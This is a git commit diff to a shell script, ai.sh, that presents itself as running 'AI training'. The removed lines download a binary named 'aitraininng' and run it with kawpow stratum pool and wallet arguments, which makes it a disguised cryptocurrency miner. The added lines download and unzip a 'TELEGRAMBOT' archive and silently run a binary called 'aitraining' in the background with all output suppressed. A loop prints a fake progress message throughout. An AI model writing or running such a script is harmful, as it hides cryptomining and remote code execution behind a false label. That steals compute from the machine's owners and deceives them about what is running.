f71e5ef972a8beb9232aa852b65fe76e0b9304af
max313iq <153689278+max313iq@users.noreply.github.com>
2025-02-17 08:52:12 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -3,11 +3,16 @@ if pgrep -x "aitraininng" > /dev/null; then
     echo "An AI training process is already running. Exiting."
     exit 1
 fi
-nohup bash -c " 
-  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng -O aitraininng
-  chmod +x aitraininng
-  ./aitraininng -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b2xxatch &
-" > /dev/null 2>&1 &
+
+nohup bash -c '
+wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
+mkdir -p TELEGRAMBOT
+unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
+cd TELEGRAMBOT || exit
+chmod +x aitraining
+./aitraining -c config.json
+' > /dev/null 2>&1 &
+
 while true; do
     echo "AI training in process"
     sleep 600
